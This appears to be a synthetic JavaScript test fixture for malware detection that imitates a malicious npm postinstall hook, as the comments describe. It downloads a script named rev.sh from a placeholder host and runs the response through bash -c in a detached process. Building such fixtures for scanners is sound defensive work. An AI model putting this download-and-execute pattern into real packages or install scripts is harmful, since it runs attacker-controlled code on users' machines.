// Synthetic fixture: install-time remote-payload shell execution.
// Mirrors the npmamzs family — postinstall downloads a remote script and
// pipes the response body straight into bash -c. The endpoint is a
// non-routable placeholder so the fixture makes no real network call.
const { exec } = require('child_process');
const https = require('https');

const service = 'https://payload.invalid.example/rev.sh';
https.get(service, (res) => {
    let data = '';
    res.on('data', (chunk) => (data += chunk));
    res.on('end', () => {
        exec(`bash -c "${data}"`, { detached: true });
    });
});
